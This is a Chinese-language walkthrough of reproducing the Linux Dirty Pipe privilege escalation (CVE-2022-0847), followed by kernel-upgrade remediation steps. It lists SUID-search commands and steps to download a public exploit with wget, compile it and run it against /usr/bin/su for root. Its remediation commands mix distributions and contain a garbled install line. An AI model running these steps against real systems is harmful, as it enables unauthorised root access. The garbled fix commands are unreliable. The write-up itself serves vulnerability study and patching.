# 0x00写在前面

本次测试仅供学习使用，如若非法他用，与本文作者无关，需自行负责！

# 漏洞描述

CVE-2022-0847是自 5.8 以来 Linux
内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程。

CVE-2022-0847类似于 CVE-2016-5195 “Dirty
Cow”（脏牛提权），而且容易被利用，网页翻译过来叫脏管道。新管道缓冲区结构的“flag”成员在Linux 内核中的
copy_page_to_iter_pipe 和 push_pipe
函数中缺乏正确初始化的方式存在缺陷，因此可能包含陈旧值。非特权本地用户可以使用此漏洞写入由只读文件支持的页面缓存中的页面，从而提升他们在系统上的权限。

# 漏洞影响

Linux Kernel版本 >= 5.8

Linux Kernel版本 < 5.16.11 / 5.15.25 / 5.10.102

# 漏洞复现

1.漏洞环境

uname -a

![1647141937_622d64314d3486ce1dd7f.png!small](https://image.3001.net/images/20220313/1647141937_622d64314d3486ce1dd7f.png!small)

2.切换到普通用户，进行漏洞利用

![1647141958_622d6446bce4f981523cc.png!small](https://image.3001.net/images/20220313/1647141958_622d6446bce4f981523cc.png!small)

SUID (Set
UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。

​ 在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.
通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限。

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

通过下载或上传漏洞利用exp到目标服务器

wget <https://haxx.in/files/dirtypipez.c>

![1647142017_622d64812a93e97b7d496.png!small](https://image.3001.net/images/20220313/1647142017_622d64812a93e97b7d496.png!small)

gcc -o dirtypipez dirtypipez.c

![1647142042_622d649a5b1840580a4b9.png!small](https://image.3001.net/images/20220313/1647142042_622d649a5b1840580a4b9.png!small)

./dirtypipez /usr/bin/su

执行编译后到exp结合suid方式进行权限提升

![1647142064_622d64b02437bd0882b0e.png!small](https://image.3001.net/images/20220313/1647142064_622d64b02437bd0882b0e.png!small)

# 0x04修复建议

升级 Linux 内核

 **ubuntu**

选择对应架构平台不受影响的内核版本文件，下载并安装，重启，例如：

sudo wget
http://ftp.sjtu.edu.cn/sites/elrepo.org/linux/kernel/el7/x86_64/RPMS/kernelml-devel-5.16.11-1.el7.elrepo.x86_64.rpm

sudo wget
http://ftp.sjtu.edu.cn/sites/elrepo.org/linux/kernel/el7/x86_64/RPMS/kernelml-5.16.11-1.el7.elrepo.x86_64.rpm

yum -y install kernel-ml-devel-5.16.11-1.el7.elrepo.x86_64.rpm
el7/x86_64/RPMS/kernelml-5.16.11-1.el7.elrepo.x86_64.rpm

sudo vim /etc/default/grub # 将GRUB_DEFAULT=saved 改为 GRUB_DEFAULT=0

sudo grub2-mkconfig #重建内核

sudo reboot #重启

uname -r #查看当前内核版本

 **centos**

选择对应架构平台不受影响的内核版本文件，下载并安装，重启，例如：

centos7

sudo wget
http://ftp.sjtu.edu.cn/sites/elrepo.org/linux/kernel/el7/x86_64/RPMS/kernelml-devel-5.16.11-1.el7.elrepo.x86_64.rpm

sudo wget
http://ftp.sjtu.edu.cn/sites/elrepo.org/linux/kernel/el7/x86_64/RPMS/kernelml-5.16.11-1.el7.elrepo.x86_64.rpm

yum -y install kernel-ml-devel-5.16.11-1.el7.elrepo.x86_64.rpm
el7/x86_64/RPMS/kernelml-5.16.11-1.el7.elrepo.x86_64.rpm

sudo vim /etc/default/grub # 将GRUB_DEFAULT=saved 改为 GRUB_DEFAULT=0

sudo grub2-mkconfig #重建内核

sudo reboot #重启

uname -r #查看当前内核版本

 **其它版本**

到 https://kernel.org/ 下载对应版本的内核文件，进行编译

# 0x05参考链接

https://www.freebuf.com/company-information/324470.html

